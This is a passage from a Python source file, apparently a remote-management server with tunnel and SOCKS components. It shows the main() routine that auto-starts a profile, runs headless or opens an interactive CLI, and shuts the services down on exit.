    if profile_auto_start and args.profile and any(row["name"] == args.profile.strip().lower() for row in server.profile_manager.list()):
        try:
            server.start_profile(args.profile)
        except ProfileError as exc:
            server.log(f"RMM-Profile {args.profile} did not start: {exc}", "WARNING")
    elif profile_auto_start and args.profile:
        print(f"{Colors.YELLOW}[*] RMM-Profile {args.profile} is not installed; install it under {profile_directory()}{Colors.END}")
    
    if not args.cli:
        print(f"{Colors.BOLD}[*] Headless mode. Press Ctrl+C to stop.{Colors.END}\n")
        try:
            while server.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
        server.stop_profile()
        server.tun.stop_all()
        server.tun_transport.stop_all()
        server.socks.stop_all()
        for http_server in http_servers:
            http_server.shutdown()
            http_server.server_close()
        return

    cli = CommandInterface(server)
    print(f"{Colors.BOLD}Embedded CLI — type 'help' for commands{Colors.END}")
    try:
        __import__("prompt_toolkit")
        _have_ptk = True
    except ImportError:
        _have_ptk = False

    if _have_ptk:
        print(
            f"{Colors.YELLOW}Tip: Client output scrolls above; your input line stays fixed at the bottom.{Colors.END}\n"
        )
        _run_cli_prompt_toolkit(server, cli)
    else:
        print(
            f"{Colors.CYAN}[*] pip install -r requirements.txt for the fixed bottom prompt (prompt_toolkit).{Colors.END}\n"
        )
        _run_cli_readline(server, cli)

    if not getattr(server, "_cli_use_ptk", False):
        readline.write_history_file(HISTORY_FILE)
    server.stop_profile()
    server.tun.stop_all()
    server.tun_transport.stop_all()
    server.socks.stop_all()
    for http_server in http_servers:
        http_server.shutdown()
        http_server.server_close()

if __name__ == "__main__":
    main()
